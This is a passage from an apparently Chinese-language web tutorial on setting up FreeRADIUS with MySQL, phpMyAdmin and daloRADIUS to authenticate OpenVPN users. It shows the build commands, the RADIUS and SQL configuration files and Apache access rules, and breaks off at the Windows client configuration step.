2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>6.安装freeradius</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">tar  xf  freeradius-server-2.1.10.tar.bz2</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">cd  freeradius-*</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">./configure</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">make &amp;&amp; make install</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">vi /etc/ld.so.conf</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">#加入:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">/usr/local/lib</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">#然后</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">ldconfig</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>启动mysql</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">/etc/init.d/mysqld start</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">#初始化mysql</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">mysql_secure_installation</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">mysql -uroot -p</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">create database radius;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">cd /usr/local/etc/raddb/sql/mysql</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">mysql -uroot -p radius &lt; schema.sql</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">mysql -uroot -p &lt; admin.sql</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>配置radiusd</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">cd /usr/local/etc/raddb</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">vi radiusd.conf</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">prefix = /usr/local</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">exec_prefix = ${prefix}</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">sysconfdir = ${prefix}/etc</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">localstatedir = ${prefix}/var</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">sbindir = ${exec_prefix}/sbin</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">logdir = ${localstatedir}/log/radius</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">raddbdir = ${sysconfdir}/raddb</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">radacctdir = ${logdir}/radacct</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">name = radiusd</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">confdir = ${raddbdir}</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">run_dir = ${localstatedir}/run/${name}</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">db_dir = ${raddbdir}</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">libdir = ${exec_prefix}/lib</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">pidfile = ${run_dir}/${name}.pid</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">max_request_time = 30</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">cleanup_delay = 5</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">max_requests = 1024</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">listen {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        type = auth</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        ipaddr = *</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        port = 0</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">}</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">listen {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        ipaddr = *</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        port = 0</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        type = acct</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">}</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">hostname_lookups = no</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">allow_core_dumps = no</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">regular_expressions     = yes</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">extended_expressions    = yes</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">log {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        destination = files</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        file = ${logdir}/radius.log</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        syslog_facility = daemon</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        stripped_names = no</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        auth = no</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        auth_badpass = no</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        auth_goodpass = no</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">}</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">checkrad = ${sbindir}/checkrad</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">security {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        max_attributes = 200</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        reject_delay = 1</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        status_server = yes</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">}</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">proxy_requests  = yes</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">$INCLUDE proxy.conf</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">$INCLUDE clients.conf</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">thread pool {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        start_servers = 5</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        max_servers = 32</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        min_spare_servers = 3</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        max_spare_servers = 10</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        max_requests_per_server = 0</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">}</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">modules {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        $INCLUDE ${confdir}/modules/</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        $INCLUDE eap.conf</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        $INCLUDE sql.conf</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        $INCLUDE sql/mysql/counter.conf</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        $INCLUDE sqlippool.conf</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">}</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">instantiate {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        exec</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        expr</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        expiration</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        logintime</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">}</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">$INCLUDE policy.conf</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">$INCLUDE sites-enabled/</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>vi clients.conf</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">client localhost {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        ipaddr = 127.0.0.1</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        secret          = testpw</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        require_message_authenticator = no</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">}</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">client 192.168.0.2 {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        ipaddr = 192.168.0.2</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        secret          = testpw</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        require_message_authenticator = no</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">}</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>vi sites-enabled/default</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">authorize {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        preprocess</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        chap</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        mschap</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        digest</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        suffix</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        eap {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                ok = return</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        sql</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        expiration</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        logintime</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        pap</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">}</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">authenticate {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        Auth-Type PAP {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                pap</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        Auth-Type CHAP {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                chap</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        Auth-Type MS-CHAP {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                mschap</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        digest</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        unix</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        eap</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">}</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">preacct {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        preprocess</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        acct_unique</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        suffix</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        files</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">}</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">accounting {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        detail</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        radutmp</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        sql</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        exec</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        attr_filter.accounting_response</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">}</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">session {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        radutmp</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">}</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">post-auth {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        exec</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        Post-Auth-Type REJECT {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                attr_filter.access_reject</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">}</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">post-proxy {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        eap</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">}</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>vi  sql.conf</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">sql {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        database = "mysql"</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        driver = "rlm_sql_${database}"</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        server = "localhost"</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        port = 3306</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        login = "radius"</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        password = "radpass"</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        radius_db = "radius"</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        acct_table1 = "radacct"</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        acct_table2 = "radacct"</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        postauth_table = "radpostauth"</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        authcheck_table = "radcheck"</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        authreply_table = "radreply"</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        groupcheck_table = "radgroupcheck"</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        groupreply_table = "radgroupreply"</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        usergroup_table = "radusergroup"</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        deletestalesessions = yes</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        sqltrace = no</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        sqltracefile = ${logdir}/sqltrace.sql</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        num_sql_socks = 5</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        connect_failure_retry_delay = 60</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        lifetime = 0</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        max_queries = 0</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        readclients = yes</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        nas_table = "nas"</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        $INCLUDE sql/${database}/dialup.conf</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">}</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>启动radius： <code>radiusd  &amp;</code></p><p>安装phpmyadmin管理mysql</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">tar xf phpMyAdmin-2.11.11.3-all-languages.tar.gz -C /var/www/</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">mv /var/www/phpMyadmin* /var/www/phpmyadmin &amp;&amp; cd /var/www/phpmyadmin</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">cp config.sample.inc.php config.inc.php</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">vi config.inc.php 修改以下</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">$cfg['blowfish_secret'] = 'ADKFdkfjdl959435dfkds^%&amp;';</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>安装daloradius管理freeradius</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">tar xf daloradius-0.9-9-rc1.tar.gz -C /var/www/</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">cd /var/www</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">mv daloradius* daloradius</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">cd /var/www/daloradius/contrib/db</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Mysql -uroot -p radius &lt; mysql-daloradius.sql</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Mysql -uroot -p radius &lt; fr2-mysql-daloradius-and-freeradius.sql</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">chown apache:apache /var/www/daloradius -R</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">chmod 644 /var/www/daloradius/library/daloradius.conf .php#配置文件需要给予写权限</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>vi /var/www/daloradius/library/daloradius.conf.php</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">$configValues['CONFIG_DB_ENGINE'] = 'mysql';</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">$configValues['CONFIG_DB_HOST'] = 'localhost';</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">$configValues['CONFIG_DB_USER'] = 'radiusadmin';</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">$configValues['CONFIG_DB_PASS'] = 'radiusadmin';</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">$configValues['CONFIG_DB_NAME'] = 'radius';</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>此处的radiusadmin账号是在phpmyadmin里创建的并给予radius库相应操作权限；</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">touch /tmp/daloradius.log</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">chown apache.apache /tmp/daloradius.log</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>vi /etc/httpd/conf/httpd.conf</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">Alias /radius "/var/www/daloradius/"</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&lt;Directory /var/www/daloradius/&gt;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">      Options None</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">      order deny,allow</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">      deny from all</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">      allow from 127.0.0.1</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">      allow from 192.168.0.0/24</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&lt;/Directory&gt;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Alias /phpmyadmin "/var/www/phpmyadmin/"</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&lt;Directory /var/www/phpmyadmin/&gt;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">      Options None</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">      order deny,allow</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">      deny from all</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">      allow from 127.0.0.1</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">      allow from 192.168.0.0/24</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">   &lt;/Directory&gt;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>启动apache  <code>/etc/init.d/httpd restart</code></p><p>访问 <a href="http://192.168.0.2/radius" target="_blank" rel="noopener noreferrer">http://192.168.0.2/radius</a></p><p>username: administrator, password: radius</p><p>在用户管理里面添加一个账号，即可用这个账号进行认证登陆。</p><p>windows客户端下载：<a href="http://swupdate.openvpn.net/community/releases/openvpn-2.2.0-install.exe" target="_blank" rel="noopener noreferrer">http://swupdate.openvpn.net/community/releases/openvpn-2.2.0-install.exe</a></p><p>修改配置文件X:\Program Files\OpenVPN\config\client.ovpn</p><div 